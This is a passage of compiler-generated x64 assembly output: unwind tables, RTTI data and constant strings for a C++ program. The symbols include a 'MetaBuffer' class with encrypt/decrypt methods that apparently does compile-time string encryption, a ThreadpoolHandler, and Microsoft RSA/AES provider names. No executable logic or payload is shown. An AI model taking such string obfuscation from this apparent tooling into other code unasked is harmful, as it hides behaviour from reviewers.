	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z DD imagerel $LN16
	DD	imagerel $LN16+509
	DD	imagerel $unwind$?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN5
	DD	imagerel $LN5+455
	DD	imagerel $unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD imagerel $LN3
	DD	imagerel $LN3+124
	DD	imagerel $unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN6
	DD	imagerel $LN6+390
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$max@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD imagerel $LN4
	DD	imagerel $LN4+97
	DD	imagerel $unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+119
	DD	imagerel $unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+98
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$min@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD imagerel $LN5
	DD	imagerel $LN5+94
	DD	imagerel $unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN4
	DD	imagerel $LN4+93
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD imagerel $LN12
	DD	imagerel $LN12+154
	DD	imagerel $unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD imagerel ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD imagerel ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@bad_alloc@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 01H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	imagerel ??_R3bad_array_new_length@std@@8
	DD	imagerel ??_R4bad_array_new_length@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD imagerel ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD imagerel ??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 01H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	imagerel ??_R3bad_alloc@std@@8
	DD	imagerel ??_R4bad_alloc@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD imagerel ??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD imagerel ??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 01H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	imagerel ??_R3exception@std@@8
	DD	imagerel ??_R4exception@std@@6B@
rdata$r	ENDS
;	COMDAT ??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@
CONST	SEGMENT
??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@ DB 'Microsoft En'
	DB	'hanced RSA and AES Cryptographic Provider (Prototype)', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@
CONST	SEGMENT
??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@ DB 'Microsoft En'
	DB	'hanced RSA and AES Cryptographic Provider', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24 DD 010H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_alloc@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT _CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	imagerel _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_TI3?AVbad_array_new_length@std@@ DD 00H
	DD	imagerel ??1bad_array_new_length@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0exception@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DQ FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DQ	FLAT:??_Ebad_array_new_length@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DQ FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DQ	FLAT:??_Ebad_alloc@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DQ FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DQ	FLAT:??_Eexception@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	045H
	DW	016dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 025054c19H
	DD	011d2322H
	DD	07016002dH
	DD	05015H
	DD	imagerel __GSHandlerCheck
	DD	0158H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+7
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc DD 088H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1
	DD	048H
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0
	ORG $+96
